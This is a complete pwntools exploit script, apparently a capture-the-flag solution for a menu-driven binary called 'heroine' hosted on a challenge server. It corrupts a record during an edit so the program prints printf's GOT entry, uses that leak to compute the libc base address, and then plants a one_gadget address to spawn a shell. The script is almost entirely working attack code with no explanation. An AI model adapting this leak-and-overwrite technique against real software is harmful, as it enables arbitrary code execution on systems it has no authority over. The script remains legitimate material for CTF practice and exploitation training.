from pwn import *

binary = './heroine.bin_patched'

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)
libc = ELF('./libc.so.6', checksec=False)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 12733)
    else:
        return process(e.path)


def add(heroine):
    log.info('Adding Heroine: %s' % heroine)
    p.recvuntil(b'>>>')
    p.sendline(b'2')
    p.sendline(heroine)


def edit(old, new):
    log.info('Editing %s<-%s' % (old, new))
    p.recvuntil(b'>>>')
    p.sendline(b'4')
    p.sendline(old)
    p.sendline(new)


def show():
    log.info('Showing heroines')
    p.recvuntil(b'>>>')
    p.sendline(b'1')


p = start()


def init_db():
    for i in range(0, 3):
        add(chr(0x41+i).encode()*4)


def leak():
    edit(b'B'*4, b'B'*56+p64(e.got['printf']))
    show()
    for _ in range(0, 3):
        p.recvuntil(b'<<< Cyber Heroine: ')
    leak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
    log.info('Printf Leak : 0x%x' % leak)
    libc.address = leak-libc.sym['printf']
    log.info('Libc Leak   : 0x%x' % libc.address)


def overwrite():
    one_gadget = libc.address+0xe3b04
    add(p64(one_gadget))


init_db()
leak()
overwrite()
p.interactive()


